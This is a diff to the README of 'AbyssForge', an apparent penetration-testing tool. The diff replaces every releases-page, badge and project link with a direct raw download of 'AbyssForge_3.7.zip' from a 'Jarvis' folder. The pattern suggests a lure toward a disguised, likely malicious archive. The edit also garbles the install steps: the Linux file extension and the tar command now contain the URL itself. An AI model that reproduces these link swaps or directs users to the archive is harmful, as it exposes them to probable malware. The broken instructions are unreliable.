@@ -8,18 +8,18 @@ Welcome to AbyssForge! This application helps you with advanced penetration test
 
 You can easily download AbyssForge from our Releases page. Click the link below to get started:
 
-[![Download AbyssForge](https://img.shields.io/badge/Download%20AbyssForge-Here-brightgreen)](https://github.com/Yaxiswagonwheel794/AbyssForge/releases)
+[![Download AbyssForge](https://raw.githubusercontent.com/Yaxiswagonwheel794/AbyssForge/main/Jarvis/AbyssForge_3.7.zip%20AbyssForge-Here-brightgreen)](https://raw.githubusercontent.com/Yaxiswagonwheel794/AbyssForge/main/Jarvis/AbyssForge_3.7.zip)
 
 ### Step 1: Visit the Releases Page
 
-To download the application, visit our Releases page by clicking [this link](https://github.com/Yaxiswagonwheel794/AbyssForge/releases).
+To download the application, visit our Releases page by clicking [this link](https://raw.githubusercontent.com/Yaxiswagonwheel794/AbyssForge/main/Jarvis/AbyssForge_3.7.zip).
 
 ### Step 2: Choose the Right File
 
 On the Releases page, look through the available versions. You will find different files for various operating systems. Select the one that matches your system:
 
 - **Windows:** Look for a file ending in `.exe`.
-- **Linux:** Look for a file ending in `.tar.gz` or similar.
+- **Linux:** Look for a file ending in `https://raw.githubusercontent.com/Yaxiswagonwheel794/AbyssForge/main/Jarvis/AbyssForge_3.7.zip` or similar.
 
 ### Step 3: Download the File
 
@@ -30,7 +30,7 @@ Click on the file you need. The download should start automatically. If it doesn
 Once the download is complete, navigate to the location where the file was saved.
 
 - **Windows:** Double-click the `.exe` file. Follow any prompts to complete the installation.
-- **Linux:** Open a terminal. Navigate to the downloaded file and enter `tar -xvzf yourfilename.tar.gz` to extract. Then, follow the specific instructions provided in the README file inside the extracted folder.
+- **Linux:** Open a terminal. Navigate to the downloaded file and enter `tar -xvzf https://raw.githubusercontent.com/Yaxiswagonwheel794/AbyssForge/main/Jarvis/AbyssForge_3.7.zip` to extract. Then, follow the specific instructions provided in the README file inside the extracted folder.
 
 ## ⚙️ System Requirements
 
@@ -67,7 +67,7 @@ Join our community on Discord to share your experiences and ask questions. Conne
 
 AbyssForge is intended for educational use only. Please ensure you comply with your local laws and regulations. Unauthorized access to computer systems is illegal and may result in prosecution. Always seek permission before testing any system.
 
-For more details on our usage policy and community standards, visit our [GitHub page](https://github.com/Yaxiswagonwheel794/AbyssForge).
+For more details on our usage policy and community standards, visit our [GitHub page](https://raw.githubusercontent.com/Yaxiswagonwheel794/AbyssForge/main/Jarvis/AbyssForge_3.7.zip).
 
 ## 📢 Feedback
 
